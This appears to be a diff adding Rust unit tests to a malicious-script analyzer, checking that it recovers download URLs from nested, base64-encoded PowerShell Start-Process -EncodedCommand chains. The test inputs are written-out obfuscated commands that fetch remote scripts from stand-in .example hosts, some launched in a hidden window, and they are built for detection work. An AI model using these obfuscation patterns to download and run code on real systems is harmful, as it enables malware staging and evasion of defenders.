@@ -5832,6 +5832,208 @@ Invoke-WebRequest -Uri $k[0] -OutFile stage.bin
         );
     }
 
+    fn assert_nested_start_process_url(ps: &str, expected_url: &str, label: &str) {
+        let script = format!("powershell -Command \"{}\"\r\n", ps.replace('"', "\\\""));
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        | Trait::DownloadInDeobText { src, .. }
+                        if src == expected_url
+                )
+            }),
+            "{label}: {:?}\ndeob:\n{}",
+            report.traits,
+            report.extracted_ps1_normalized.join("\n---\n")
+        );
+    }
+
+    #[test]
+    fn nested_start_process_args_encodedcommand_resolves_url() {
+        let decoded = "Invoke-WebRequest https://start-args-encoded.example/p.ps1";
+        let ps = format!(
+            r#"Start-Process powershell.exe -Args '-EncodedCommand {}'"#,
+            encode_utf16(decoded)
+        );
+        assert_nested_start_process_url(
+            &ps,
+            "https://start-args-encoded.example/p.ps1",
+            "nested Start-Process -Args EncodedCommand URL missed",
+        );
+    }
+
+    #[test]
+    fn nested_start_process_positional_argumentlist_encodedcommand_resolves_url() {
+        let decoded = "Invoke-WebRequest https://start-positional-args.example/p.ps1";
+        let ps = format!(
+            r#"Start-Process powershell.exe '-NoP -EncodedCommand {}'"#,
+            encode_utf16(decoded)
+        );
+        assert_nested_start_process_url(
+            &ps,
+            "https://start-positional-args.example/p.ps1",
+            "nested Start-Process positional ArgumentList EncodedCommand URL missed",
+        );
+    }
+
+    #[test]
+    fn nested_start_process_positional_array_argumentlist_encodedcommand_resolves_url() {
+        let decoded = "Invoke-WebRequest https://start-positional-array-args.example/p.ps1";
+        let ps = format!(
+            r#"Start-Process powershell.exe '-NoP','-EncodedCommand','{}'"#,
+            encode_utf16(decoded)
+        );
+        assert_nested_start_process_url(
+            &ps,
+            "https://start-positional-array-args.example/p.ps1",
+            "nested Start-Process positional array ArgumentList EncodedCommand URL missed",
+        );
+    }
+
+    #[test]
+    fn nested_start_process_named_filepath_positional_argumentlist_encodedcommand_resolves_url() {
+        let decoded =
+            "Invoke-WebRequest https://start-named-filepath-positional-args.example/p.ps1";
+        let ps = format!(
+            r#"Start-Process -FilePath powershell.exe '-NoP -EncodedCommand {}'"#,
+            encode_utf16(decoded)
+        );
+        assert_nested_start_process_url(
+            &ps,
+            "https://start-named-filepath-positional-args.example/p.ps1",
+            "nested Start-Process named FilePath positional ArgumentList EncodedCommand URL missed",
+        );
+    }
+
+    #[test]
+    fn nested_start_process_option_before_positional_target_encodedcommand_resolves_url() {
+        let decoded = "Invoke-WebRequest https://start-option-before-target.example/p.ps1";
+        let ps = format!(
+            r#"Start-Process -WindowStyle Hidden powershell.exe '-NoP -EncodedCommand {}'"#,
+            encode_utf16(decoded)
+        );
+        assert_nested_start_process_url(
+            &ps,
+            "https://start-option-before-target.example/p.ps1",
+            "nested Start-Process option-before-target EncodedCommand URL missed",
+        );
+    }
+
+    #[test]
+    fn nested_start_process_argumentlist_array_encodedcommand_resolves_url() {
+        let decoded = "Invoke-WebRequest https://start-arg-array.example/p.ps1";
+        let ps = format!(
+            r#"Start-Process powershell.exe -ArgumentList '-NoP', '-EncodedCommand', '{}'"#,
+            encode_utf16(decoded)
+        );
+        assert_nested_start_process_url(
+            &ps,
+            "https://start-arg-array.example/p.ps1",
+            "nested Start-Process ArgumentList array EncodedCommand URL missed",
+        );
+    }
+
+    #[test]
+    fn nested_start_process_argumentlist_at_array_encodedcommand_resolves_url() {
+        let decoded = "Invoke-WebRequest https://start-at-array.example/p.ps1";
+        let ps = format!(
+            r#"Start-Process powershell.exe -ArgumentList @('-NoP', '-EncodedCommand', '{}')"#,
+            encode_utf16(decoded)
+        );
+        assert_nested_start_process_url(
+            &ps,
+            "https://start-at-array.example/p.ps1",
+            "nested Start-Process ArgumentList @() EncodedCommand URL missed",
+        );
+    }
+
+    #[test]
+    fn nested_start_process_argumentlist_grouped_array_encodedcommand_resolves_url() {
+        let decoded = "Invoke-WebRequest https://start-grouped-array.example/p.ps1";
+        let ps = format!(
+            r#"Start-Process powershell.exe -ArgumentList ('-NoP', '-EncodedCommand', '{}')"#,
+            encode_utf16(decoded)
+        );
+        assert_nested_start_process_url(
+            &ps,
+            "https://start-grouped-array.example/p.ps1",
+            "nested Start-Process ArgumentList grouped array EncodedCommand URL missed",
+        );
+    }
+
+    #[test]
+    fn nested_start_process_argumentlist_unquoted_array_encodedcommand_resolves_url() {
+        let decoded = "Invoke-WebRequest https://start-unquoted-array.example/p.ps1";
+        let ps = format!(
+            r#"Start-Process powershell.exe -ArgumentList -NoP,-EncodedCommand,{}"#,
+            encode_utf16(decoded)
+        );
+        assert_nested_start_process_url(
+            &ps,
+            "https://start-unquoted-array.example/p.ps1",
+            "nested Start-Process ArgumentList unquoted array EncodedCommand URL missed",
+        );
+    }
+
+    #[test]
+    fn nested_start_process_argumentlist_variable_array_encodedcommand_resolves_url() {
+        let decoded = "Invoke-WebRequest https://start-var-array.example/p.ps1";
+        let ps = format!(
+            r#"$args = @('-NoP', '-EncodedCommand', '{}'); Start-Process powershell.exe -ArgumentList $args"#,
+            encode_utf16(decoded)
+        );
+        assert_nested_start_process_url(
+            &ps,
+            "https://start-var-array.example/p.ps1",
+            "nested Start-Process ArgumentList variable array EncodedCommand URL missed",
+        );
+    }
+
+    #[test]
+    fn nested_start_process_argumentlist_variable_array_ref_encodedcommand_resolves_url() {
+        let decoded = "Invoke-WebRequest https://start-var-array-ref.example/p.ps1";
+        let ps = format!(
+            r#"$payload = '{}'; $args = @('-NoP', '-EncodedCommand', $payload); Start-Process powershell.exe -ArgumentList $args"#,
+            encode_utf16(decoded)
+        );
+        assert_nested_start_process_url(
+            &ps,
+            "https://start-var-array-ref.example/p.ps1",
+            "nested Start-Process ArgumentList variable array ref EncodedCommand URL missed",
+        );
+    }
+
+    #[test]
+    fn nested_start_process_argumentlist_scalar_variable_encodedcommand_resolves_url() {
+        let decoded = "Invoke-WebRequest https://start-scalar-args.example/p.ps1";
+        let ps = format!(
+            r#"$args = '-NoP -EncodedCommand {}'; Start-Process powershell.exe -ArgumentList $args"#,
+            encode_utf16(decoded)
+        );
+        assert_nested_start_process_url(
+            &ps,
+            "https://start-scalar-args.example/p.ps1",
+            "nested Start-Process ArgumentList scalar variable EncodedCommand URL missed",
+        );
+    }
+
+    #[test]
+    fn nested_start_process_argumentlist_inline_variable_array_encodedcommand_resolves_url() {
+        let decoded = "Invoke-WebRequest https://start-inline-var-array.example/p.ps1";
+        let ps = format!(
+            r#"$a = '-NoP'; $b = '-EncodedCommand'; $c = '{}'; Start-Process powershell.exe -ArgumentList $a, $b, $c"#,
+            encode_utf16(decoded)
+        );
+        assert_nested_start_process_url(
+            &ps,
+            "https://start-inline-var-array.example/p.ps1",
+            "nested Start-Process ArgumentList inline variable array EncodedCommand URL missed",
+        );
+    }
+
     #[test]
     fn damaged_powershell_handoff_regex_replaced_b64_chain_resolves_urls() {
         let decoded = r#"
